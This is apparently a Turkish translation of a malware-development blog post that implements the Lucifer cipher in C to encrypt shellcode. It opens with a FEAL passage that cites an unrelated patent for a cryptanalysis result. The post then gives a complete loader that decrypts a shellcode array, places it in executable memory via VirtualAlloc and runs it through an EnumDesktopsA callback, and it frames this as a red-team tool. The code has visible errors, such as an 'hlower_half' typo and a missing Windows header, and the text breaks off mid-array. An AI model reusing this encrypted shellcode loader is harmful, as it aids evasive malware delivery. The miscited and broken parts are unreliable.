Tasarımcılar, 8 turlu FEAL ile yanıt verdiler ancak Biham ve Shamir, bunu SECURICOM '89 konferansında kriptanaliz etti (A. Shamir ve A. Fiat, "Method, Apparatus and Article for Identification and Signature," U.S. Patent #4,748,668, 31 Mayıs 1988).
FEAL-8'e yönelik başka bir seçilmiş açık metin saldırısı (H. Gilbert ve G. Chase, "A Statistical Attack on the Feal-8 Cryptosystem," Advances in Cryptology—CRYPTO’90 Proceedings, Springer–Verlag, 1991, s. 22–33), sadece 10.000 blok kullanarak yaratıcılarını FEAL-N’yi tanımlamaya zorladı. FEAL-N, değişken sayıda tur içermektedir (elbette 8’den fazla).
Biham ve Shamir, diferansiyel kriptanaliz kullanarak FEAL-N'yi kaba kuvvetten daha hızlı kırmayı başardı (2^64 seçilmiş açık metin şifrelemeleriyle) ve N < 32 için kırılabilir olduğunu gösterdi. FEAL-16’nın kırılması için 2^28 seçilmiş açık metin veya 2^46.5 bilinen açık metin gerekiyordu. FEAL-8’in kırılması için 2000 seçilmiş açık metin veya 2^37.5 bilinen açık metin gerekiyordu. FEAL-4, yalnızca sekiz dikkatlice seçilmiş açık metinle kırılabiliyordu.
Bu yazının, kötü amaçlı yazılım araştırmacıları ve C/C++ programcıları için faydalı olmasını umuyorum. Aynı zamanda, mavi takımın bu ilginç şifreleme tekniğine karşı farkındalığını artırarak kırmızı takımın cephaneliğine yeni bir araç eklediğini düşünüyorum.
FEAL-8 encryption
Malware and cryptography 1
Github’taki kaynak kod

96. kötü amaçlı yazılım ve kriptografi araştırması - bölüm 5 (33): Lucifer algoritmasıyla payload şifreleme. Basit C örneği.

﷽
Merhaba, siber güvenlik meraklıları ve beyaz hackerlar!

+++++++++++++++++++++++++++++++++++++++++++++++

Bu gönderi, Lucifer blok şifreleyicisinin kötü amaçlı yazılım geliştirmede kullanımı üzerine kendi araştırmamın bir sonucudur. Her zamanki gibi, çeşitli kripto algoritmalarını keşfederken, bunu şifreleme/şifre çözme için uygularsak ne olacağını kontrol etmeye karar verdim.
Feistel ağları

Okuyucularımın isteği üzerine, Feistel ağının ne olduğunu hatırlatmak istiyorum. Bu, modern kriptografi ve şifreleme sistemlerinde hayati bir rol oynayan çok önemli bir kavramdır.
Feistel ağı, 1971 yılında IBM Laboratuvarlarında Horst Feistel tarafından oluşturulan bir blok şifreleme tekniğidir.
Feistel ağı, her bloğu sol (𝐿) ve sağ (𝑅) alt bloklar olmak üzere iki eşit parçaya bölen bir blok şifreleme yapısıdır. Sol alt blok şu fonksiyon kullanılarak dönüştürülür:


𝑥 = 𝑓(𝐿, 𝐾)


burada 𝐾 anahtarı temsil eder. Bu fonksiyon, bir kaydırma şifrelemesi gibi herhangi bir kriptografik işlem olabilir.
Dönüştürülen sol alt blok daha sonra değiştirilmemiş sağ alt blok ile XOR işlemine tabi tutulur: 𝑥 = 𝑥 ⊕ 𝑅.
Bundan sonra, sol ve sağ alt bloklar yer değiştirir ve işlem birkaç tur boyunca tekrar eder.
Sonuç olarak şifrelenmiş veri elde edilir.
Lucifer


Lucifer, 1970'lerde IBM'de Horst Feistel tarafından oluşturulan en eski blok şifreleyicilerden biridir.
128-bit bloklar üzerinde çalışan ve Feistel ağı kullanan simetrik anahtar şifreleyicisidir. Bu yapı, daha sonra daha popüler olan Veri Şifreleme Standardı (DES) için temel oluşturmuştur.


Lucifer şifrelemesinde, düz metin iki segmente ayrılır; bir segment dönüştürülür ve ortaya çıkan çıktı diğer segment ile XOR işlemine tabi tutulur. Bu işlem, güvenliği sağlamak için S-kutuları, permütasyonlar ve anahtar planları kullanılarak birkaç kez tekrarlanır.


Lucifer’in S-kutuları 4-bit girişleri alır ve 4-bit çıkışlar üretir; S-kutularının girdisi, önceki turdaki S-kutularının bit-permute edilmiş çıktısından türetilirken, başlangıç turundaki girdisi düz metindir.
Önemli bir bit, iki mevcut S-kutusundan belirli birini seçmek için kullanılır.
Lucifer, 9 giriş biti ve 8 çıkış biti olan tek bir T-kutusu olarak gösterilir.
DES'in aksine, turlar arasında değişim yoktur ve blok yarıları kullanılmaz.
Lucifer, 16 tur kullanır, 128-bit bloklarla çalışır ve DES'e kıyasla daha az karmaşık bir anahtar planına sahiptir.
pratik örnek 1

Bunu pratikte uygulayalım. Öncelikle, yardımcı fonksiyonları, sabitleri ve makroları tanımlamamız gerekiyor:
#define block_size 16 // 128 bit
#define key_size 16 // 128 bit
static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}
Daha sonra, ana şifreleme fonksiyonuna ihtiyacımız var.
Lucifer şifreleme fonksiyonumuzu adım adım açıklayalım.

Bu fonksiyon, 128-bit bir blok (16 bayt) ve bir anahtar alır. Blok, iki eşit yarıya bölünür: lower_half (ilk 8 bayt) ve upper_half (son 8 bayt):
char* lower_half = block;
char* upper_half = block + block_size / 2;

Şifre çözme işlemi yapılıyorsa, başlangıçtaki anahtar bayt indeksi 8 olarak ayarlanır; aksi takdirde 0'dan başlar.
Şifreleme veya şifre çözme sırasında toplam 16 tur gerçekleştirilir:
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
16 tur boyunca dönüşümler için bir döngü başlatılır. Şifre çözme işlemi yapılıyorsa, anahtar indeksi her turdan sonra 1 artırılır ve 16'ya ulaştığında modül işlemiyle sıfırlanır:
for (int round = 0; round < round_count; ++round) {
if (decrypt) 
key_byte_idx = (key_byte_idx + 1) % round_count;
}
Her turda, upper_half içindeki her bayt için 8 adım işlenir.
Burada, message_byte işlenen bayttır:
for (int step = 0; step < 8; ++step) {char message_byte = upper_half[step];}
Bu blok, karmaşıklık adımını uygular. Anahtar baytına ve adıma bağlı olarak, message_byte değerini değiştirmek için s0 veya s1 yerine koyma kutularından hangisinin kullanılacağını belirleriz.Bu işlem, Feistel ağlarındaki S-kutularına benzer bir süreçtir:
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0[lowsubbyte
(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1[lowsubbyte
(message_byte)];
}
Daha sonra, anahtar kesme mantığı uygulanır:
message_byte ^= key[key_byte_idx];
Burada, dönüştürülmüş bayt, anahtar baytı ile XOR işlemine tabi tutulur. Bu, şifrelemeye ek karmaşıklık katar ve mesajın her baytının anahtar tarafından etkilenmesini sağlar.


Sonraki adım, message_byte içindeki bitlerin önceden tanımlanmış maskelere (m1) göre sola veya sağa kaydırıldığı permütasyon adımıdır.
Bu adım, her bitin tüm bayt üzerinde etkisini yayarak karıştırma işlemi gerçekleştirir:
message_byte =
	 (shift_right(message_byte & m1[0], 3)) |
	(shift_right(message_byte & m1[1], 4)) |
	(shift_left(message_byte & m1[2], 2)) |
	(shift_right(message_byte & m1[3], 1)) |
	(shift_left(message_byte & m1[4], 2)) |
	(shift_left(message_byte & m1[5], 4)) |
	(shift_right(message_byte & m1[6], 1)) |
	(shift_left(message_byte & m1[7], 1));
Elde edilen message_byte, lower_half içindeki çeşitli bitler ile XOR işlemine tabi tutulur.
Bu, lower_half içindeki değişikliklerin yayılmasını sağlar ve blok yarılarının birbirini etkilemesini garanti eder:
lower_half[(7 + step) % step_count] =
((message_byte ^ lower_half[(7 + step) % step_count]) &
m1[0]) | (lower_half[(7 + step) % step_count] & m2[0]);
// repeat similar logic for other bits...
Daha sonra, key_byte_idx artırılarak bir sonraki adımda farklı bir anahtar baytının kullanılması sağlanır.Şifreleme yapılıyorsa, bu adım son adım hariç her adımda gerçekleşir:
if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}


Her turun sonunda, lower_half ve upper_half yer değiştirir.
Bu, Feistel ağı tasarımının önemli bir parçasıdır ve bir sonraki turda her iki bloğun da işlenmesini sağlar:

for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}

Tüm turlar tamamlandıktan sonra, bölümler tekrar değiştirilir ve şifreleme işlemi sona erer.
Bu, Feistel tasarımına uygun şekilde nihai şifrelenmiş bloğun oluşmasını sağlar:
for (int i = 0; i < block_size / 2; ++i) {
	swap(&block[i], &block[i + block_size / 2]);
}

Bu fonksiyonun tam kaynak kodu şu şekilde görünüyor:

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}
Bu fonksiyon, 128-bit bir bloğu 16 tur boyunca karıştırma, yayılma ve permütasyon işlemlerine tabi tutar.
Her turda, upper_half içindeki baytlar değiştirilir ve lower_half içine değişiklikler yayılır.
Anahtar, her adımda S-kutusu değiştirme ve XOR işlemlerini kontrol etmek için kullanılır.
Blok yarıları, her turun sonunda yer değiştirir ve Feistel ağı tasarımına uygun olarak işlenir.


Son olarak, düz metin bloğunu nasıl şifreleyebileceğimizi gösteren tam kaynak kodu şu şekildedir (hack.c):
/*
* hack.c
* Lucifer encryption example
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
*/
#include <stdio.h>
#include <stdbool.h>
#include <string.h>
#define block_size 16 // 128 bit
#define key_size 16 // 128 bit
static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

// macro to perform bitwise shifts
#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))

// extract high and low nibbles
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

// swap function for char types
void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}
void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}

int main() {
char message[block_size + 1] = "meowmeowmeowmeow"; // 16 characters + null

// terminator
char key[key_size] = "abcdefghijklmnop"; // example 128-bit key
message[block_size] = '\0'; // add a null terminator at the end of the

// message
printf("original block: %s\n", message);
Lucifer(message, key, false); // encrypt
printf("encrypted block: ");
for (int i = 0; i < block_size; i++) {
	printf("%02x ", (unsigned char)message[i]);
}
printf("\n");

Lucifer(message, key, true); // decrypt
printf("decrypted block: %s\n", message);
return 0;
}
Gördüğünüz gibi, ana fonksiyonda yalnızca meowmeowmeowmeow mesajını şifreledim.
demo 1

Bu kodun nasıl çalıştığını görelim. Linux için derleyin:
gcc hack.c -o hack
+++++++++++++++++++++++++++++++++++++++++++++++
Sonra çalıştıralım:
 ./hack
+++++++++++++++++++++++++++++++++++++++++++++++
Gördüğünüz gibi, bu durumda her şey mükemmel çalıştı.
pratik örnek 2

Şimdi, farklı bir mantıkla uygulayalım: şifrele / şifre çöz ve çalıştır.


Bu kodun kaynak kodu, ilk örnektekine benzer; tek fark, iki yeni fonksiyon eklenmiş olmasıdır:
// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, false);
}
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, true);
}
}
Bu sürüm, Lucifer şifreleyicisini doğru bir şekilde hack.c fonksiyonunu kullanarak uygular ve şifreleme/şifre çözme sürecini payload bloklarına uygular.
Lucifer fonksiyonu, lucifer_encrypt_payload ve lucifer_decrypt_payload içinde entegre edilmiştir ve doğru şifreleme akışını garanti eder.


Tam kaynak kodu şu şekildedir (hack2.c):
/*
* hack.c
* Lucifer payload encryption/decryption
* author: @cocomelonc
* https://cocomelonc.github.io/malware/2024/10/20/malware-cryptography-33.html
*/
#include <stdio.h>
#include <stdbool.h>
#include <string.h>

#define block_size 16 // 128 bit
#define key_size 16 // 128 bit

static const unsigned char s0[16] = {
0x0C, 0x0F, 0x07, 0x0A, 0x0E, 0x0D, 0x0B, 0x00,
0x02, 0x06, 0x03, 0x01, 0x09, 0x04, 0x05, 0x08
};
static const unsigned char s1[16] = {
	0x07, 0x02, 0x0E, 0x09, 0x03, 0x0B, 0x00, 0x04,
	0x0C, 0x0D, 0x01, 0x0A, 0x06, 0x0F, 0x08, 0x05
};
static const unsigned char m1[8] = {
	0x80, 0x40, 0x20, 0x10, 0x08, 0x04, 0x02, 0x01
};
static const unsigned char m2[8] = {
	0x7F, 0xBF, 0xDF, 0xEF, 0xF7, 0xFB, 0xFD, 0xFE
};

#define shift_left(x, n) ((x) << (n))
#define shift_right(x, n) ((unsigned char)(x) >> (n))
#define highsubbyte(x) shift_right((x), 4)
#define lowsubbyte(x) ((x) & 0x0F)

void swap(char* arg1, char* arg2) {
	char tmp = *arg1;
	*arg1 = *arg2;
	*arg2 = tmp;
}

void Lucifer(char block[block_size], char key[key_size], bool decrypt) {
char* lower_half = block;
char* upper_half = block + block_size / 2;
int key_byte_idx = decrypt ? 8 : 0;
const int round_count = 16;
for (int round = 0; round < round_count; ++round) {
if (decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
}

int transform_control_byte_idx = key_byte_idx;
const int step_count = 8;

for (int step = 0; step < step_count; ++step) {
char message_byte = upper_half[step];

// confusion
if (key[transform_control_byte_idx] & m1[step_count - step - 1]) {
message_byte = shift_left(s1[highsubbyte(message_byte)], 4) | s0
[lowsubbyte(message_byte)];
} else {
message_byte = shift_left(s0[highsubbyte(message_byte)], 4) | s1
[lowsubbyte(message_byte)];
}

// key interruption
message_byte ^= key[key_byte_idx];

// permutation
message_byte =      (shift_right(message_byte & m1[0], 3)) |
(shift_right(message_byte & m1[1], 4)) |
(shift_left(message_byte & m1[2], 2)) |
(shift_right(message_byte & m1[3], 1)) |
(shift_left(message_byte & m1[4], 2)) |
(shift_left(message_byte & m1[5], 4)) |
(shift_right(message_byte & m1[6], 1)) |
(shift_left(message_byte & m1[7], 1));
// diffusion
hlower_half[(7 + step) % step_count] = ((message_byte ^ lower_half[(7 +
step) % step_count]) & m1[0]) | (lower_half[(7 + step) % step_count] &
m2[0]);
lower_half[(6 + step) % step_count] = ((message_byte ^ lower_half[(6 +
step) % step_count]) & m1[1]) | (lower_half[(6 + step) % step_count] &
m2[1]);
lower_half[(2 + step) % step_count] = ((message_byte ^ lower_half[(2 +
step) % step_count]) & m1[2]) | (lower_half[(2 + step) % step_count] &
m2[2]);
lower_half[(1 + step) % step_count] = ((message_byte ^ lower_half[(1 +
step) % step_count]) & m1[3]) | (lower_half[(1 + step) % step_count] &
m2[3]);
lower_half[(5 + step) % step_count] = ((message_byte ^ lower_half[(5 +
step) % step_count]) & m1[4]) | (lower_half[(5 + step) % step_count] &
m2[4]);
lower_half[(0 + step) % step_count] = ((message_byte ^ lower_half[(0 +
step) % step_count]) & m1[5]) | (lower_half[(0 + step) % step_count] &
m2[5]);
lower_half[(3 + step) % step_count] = ((message_byte ^ lower_half[(3 +
step) % step_count]) & m1[6]) | (lower_half[(3 + step) % step_count] &
m2[6]);
lower_half[(4 + step) % step_count] = ((message_byte ^ lower_half[(4 +
step) % step_count]) & m1[7]) | (lower_half[(4 + step) % step_count] &
m2[7]);

if (step < step_count - 1 || decrypt) {
	key_byte_idx = (key_byte_idx + 1) % round_count;
		}
	   } 

// swap halves
for (int i = 0; i < block_size / 2; ++i) {
	swap(&lower_half[i], &upper_half[i]);
}
	}
// physically swap halves
for (int i = 0; i < block_size / 2; ++i) {
swap(&block[i], &block[i + block_size / 2]);
}
}

// payload encryption function
void lucifer_encrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, false);
}
}

// payload decryption function
void lucifer_decrypt_payload(unsigned char* payload, int payload_len,
unsigned char* key) {
for (int i = 0; i < payload_len / block_size; i++) {
	Lucifer((char*)(payload + i * block_size), (char*)key, true);
}
}


int main() {
	unsigned char key[16] = "meowmeowbowwoow"; // example 128-bit key
unsigned char my_payload[] = {
0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
0x21, 0x0, 0x3d, 0x5e, 0x2e, 0x2e, 0x5e, 0x3d, 0x0
};

int my_payload_len = sizeof(my_payload);
int pad_len = my_payload_len + (block_size - my_payload_len % block_size) %
block_size;

unsigned char padded[pad_len];
memset(padded, 0x90, pad_len); // pad with NOPs (0x90)
memcpy(padded, my_payload, my_payload_len);

printf("original payload: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", my_payload[i]);
}
printf("\n\n");

// encrypt the payload
lucifer_encrypt_payload(padded, pad_len, key);

printf("encrypted payload: ");
for (int i = 0; i < pad_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

// decrypt the payload
lucifer_decrypt_payload(padded, pad_len, key);

printf("decrypted payload: ");
for (int i = 0; i < my_payload_len; i++) {
	printf("%02x ", padded[i]);
}
printf("\n\n");

LPVOID mem = VirtualAlloc(NULL, my_payload_len, MEM_COMMIT,
PAGE_EXECUTE_READWRITE);
RtlMoveMemory(mem, padded, my_payload_len);
EnumDesktopsA(GetProcessWindowStation(), (DESKTOPENUMPROCA)mem, NULL);
return 0;
}
Her zamanki gibi, burada meow-meow mesaj kutusu payload kullanılmıştır:
unsigned char my_payload[] = {
0xfc, 0x48, 0x81, 0xe4, 0xf0, 0xff, 0xff, 0xff, 0xe8, 0xd0, 0x0, 0x0,
0x0, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65,
0x48, 0x8b, 0x52, 0x60, 0x3e, 0x48, 0x8b, 0x52, 0x18, 0x3e, 0x48, 0x8b,
0x52, 0x20, 0x3e, 0x48, 0x8b, 0x72, 0x50, 0x3e, 0x48, 0xf, 0xb7, 0x4a,
0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x2,
0x2c, 0x20, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0xe2, 0xed, 0x52,
0x41, 0x51, 0x3e, 0x48, 0x8b, 0x52, 0x20, 0x3e, 0x8b, 0x42, 0x3c, 0x48,
0x1, 0xd0, 0x3e, 0x8b, 0x80, 0x88, 0x0, 0x0, 0x0, 0x48, 0x85, 0xc0,
0x74, 0x6f, 0x48, 0x1, 0xd0, 0x50, 0x3e, 0x8b, 0x48, 0x18, 0x3e, 0x44,
0x8b, 0x40, 0x20, 0x49, 0x1, 0xd0, 0xe3, 0x5c, 0x48, 0xff, 0xc9, 0x3e,
0x41, 0x8b, 0x34, 0x88, 0x48, 0x1, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31,
0xc0, 0xac, 0x41, 0xc1, 0xc9, 0xd, 0x41, 0x1, 0xc1, 0x38, 0xe0, 0x75,
0xf1, 0x3e, 0x4c, 0x3, 0x4c, 0x24, 0x8, 0x45, 0x39, 0xd1, 0x75, 0xd6,
0x58, 0x3e, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x1, 0xd0, 0x66, 0x3e, 0x41,
0x8b, 0xc, 0x48, 0x3e, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x1, 0xd0, 0x3e,
0x41, 0x8b, 0x4, 0x88, 0x48, 0x1, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e,
0x59, 0x5a, 0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20,
0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x3e, 0x48, 0x8b, 0x12,
0xe9, 0x49, 0xff, 0xff, 0xff, 0x5d, 0x49, 0xc7, 0xc1, 0x0, 0x0, 0x0,
0x0, 0x3e, 0x48, 0x8d, 0x95, 0xfe, 0x0, 0x0, 0x0, 0x3e, 0x4c, 0x8d,
0x85, 0x9, 0x1, 0x0, 0x0, 0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83,
0x56, 0x7, 0xff, 0xd5, 0x48, 0x31, 0xc9, 0x41, 0xba, 0xf0, 0xb5, 0xa2,
0x56, 0xff, 0xd5, 0x4d, 0x65, 0x6f, 0x77, 0x2d, 0x6d, 0x65, 0x6f, 0x77,
